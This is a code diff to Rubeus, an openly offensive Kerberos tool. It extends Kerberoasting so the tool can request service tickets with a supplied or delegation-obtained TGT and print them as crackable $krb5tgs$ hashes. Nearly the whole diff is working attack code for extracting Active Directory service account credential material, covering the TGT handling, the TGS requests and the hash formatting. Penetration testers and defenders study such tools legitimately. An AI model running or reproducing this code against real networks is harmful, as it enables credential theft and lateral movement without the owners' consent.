@@ -264,14 +264,36 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "")
+        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, bool useTGTdeleg = false)
         {
             Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");
+
+            if (TGT != null)
+            {
+                Console.WriteLine("[*] Using a TGT /ticket to request service tickets\r\n");
+            }
+            else if (useTGTdeleg)
+            {
+                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user\r\n");
+                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
+                TGT = new KRB_CRED(delegTGTbytes);
+            }
 
             if (!String.IsNullOrEmpty(spn))
             {
                 Console.WriteLine("[*] Target SPN             : {0}", spn);
-                GetDomainSPNTicket(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
+
+                if (TGT != null)
+                {
+                    // if a TGT .kirbi is supplied, use that for the request
+                    //      this could be a passed TGT or if TGT delegation is specified
+                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, dc);
+                }
+                else
+                {
+                    // otherwise use the KerberosRequestorSecurityToken method
+                    GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
+                }
             }
             else {
                 if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
@@ -371,7 +393,16 @@ namespace Rubeus
                 // check to ensure that the bind worked correctly
                 try
                 {
-                    Guid guid = directoryObject.Guid;
+                    //Guid guid = directoryObject.Guid;
+                    string dirPath = directoryObject.Path;
+                    if (String.IsNullOrEmpty(dirPath))
+                    {
+                        Console.WriteLine("\r\n[*] Searching the current domain for Kerberoastable users");
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[*] Searching path '{0}' for Kerberoastable users", dirPath);
+                    }
                 }
                 catch (DirectoryServicesCOMException ex)
                 {
@@ -411,6 +442,10 @@ namespace Rubeus
                     {
                         Console.WriteLine("\r\n[X] No users found to Kerberoast!");
                     }
+                    else
+                    {
+                        Console.WriteLine("\r\n[*] Found {0} users to Kerberoast!\r\n", users.Count);
+                    }
 
                     foreach (SearchResult user in users)
                     {
@@ -423,10 +458,30 @@ namespace Rubeus
                         if (!String.IsNullOrEmpty(domain))
                         {
                             string SPN = String.Format("{0}@{1}", servicePrincipalName, domain);
-                            GetDomainSPNTicket(SPN, userName, distinguishedName, cred, outFile);
+                            if (TGT != null)
+                            {
+                                // if a TGT .kirbi is supplied, use that for the request
+                                //      this could be a passed TGT or if TGT delegation is specified
+                                GetTGSRepHash(TGT, SPN, samAccountName, distinguishedName, outFile, dc);
+                            }
+                            else
+                            {
+                                // otherwise use the KerberosRequestorSecurityToken method
+                                GetTGSRepHash(SPN, samAccountName, distinguishedName, cred, outFile);
+                            }
                         }
                         else {
-                            GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred, outFile);
+                            if (TGT != null)
+                            {
+                                // if a TGT .kirbi is supplied, use that for the request
+                                //      this could be a passed TGT or if TGT delegation is specified
+                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc);
+                            }
+                            else
+                            {
+                                // otherwise use the KerberosRequestorSecurityToken method
+                                GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile);
+                            }
                         }
                     }
                 }
@@ -443,7 +498,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "")
+        public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "")
         {
             string domain = "DOMAIN";
 
@@ -553,5 +608,73 @@ namespace Rubeus
                 Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
             }
         }
+
+        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", string domainController = "")
+        {
+            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
+
+            // extract out the info needed for the TGS-REQ request
+            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
+            string domain = TGT.enc_part.ticket_info[0].prealm;
+            Ticket ticket = TGT.tickets[0];
+            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
+            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+            //Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.rc4_hmac;
+
+            string[] services = spn.Split(',');
+            foreach (string sname in services)
+            {
+                // request the new service tickt
+                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, false, domainController, false);
+
+                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
+
+                DisplayTGShash(tgsKirbi, true);
+
+                Console.WriteLine();
+            }
+        }
+
+        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN")
+        {
+            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form
+
+            int encType = cred.tickets[0].enc_part.etype;
+            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
+            string domainName = cred.enc_part.ticket_info[0].prealm;
+            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
+
+            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);
+            string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+
+            bool header = false;
+            foreach (string line in Helpers.Split(hash, 80))
+            {
+                if (!header)
+                {
+                    if (kerberoastDisplay)
+                    {
+                        Console.WriteLine("[*] Hash                   : {0}", line);
+                    }
+                    else
+                    {
+                        Console.WriteLine("  Kerberoast Hash       :  {0}", line);
+                    }
+                }
+                else
+                {
+                    if (kerberoastDisplay)
+                    {
+                        Console.WriteLine("                             {0}", line);
+                    }
+                    else
+                    {
+                        Console.WriteLine("                           {0}", line);
+                    }
+                }
+                header = true;
+            }
+        }
+
     }
 }
